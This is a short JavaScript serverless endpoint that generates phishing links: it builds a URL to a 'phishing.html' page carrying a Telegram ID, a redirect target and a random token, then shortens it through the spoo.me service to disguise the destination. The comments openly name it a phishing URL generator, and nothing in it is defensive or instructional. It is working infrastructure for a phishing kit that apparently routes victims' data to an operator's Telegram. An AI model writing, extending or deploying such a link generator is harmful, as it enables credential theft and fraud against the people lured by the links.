export default async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { telegramId, redirectUrl } = req.body;

    // Generate unique token
    const token = [...Array(32)].map(() => 
      Math.random().toString(36)[2]).join('');
    
    // Generate phishing URL
    const phishingUrl = `https://opaslabs.vercel.app/phishing.html?telegramId=${telegramId}&redirectUrl=${encodeURIComponent(redirectUrl)}&token=${token}`;
    
    // Shorten URL using spoo.me API - CORRECTED
    try {
      const shortenResponse = await fetch('https://spoo.me/', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/x-www-form-urlencoded',
          'Accept': 'application/json'
        },
        body: new URLSearchParams({ url: phishingUrl })
      });

      const data = await shortenResponse.json();
      
      // Handle successful shortening
      if (data.short_url) {
        return res.status(200).json({ link: data.short_url });
      } 
      // Handle API error response
      else if (data.message) {
        console.error('Spoo.me error:', data.message);
        return res.status(200).json({ link: phishingUrl });
      }
    } catch (shortenError) {
      console.error('URL shortening failed:', shortenError);
    }

    // Fallback to original URL if any error occurs
    res.status(200).json({ link: phishingUrl });

  } catch (error) {
    console.error('Generation error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
};
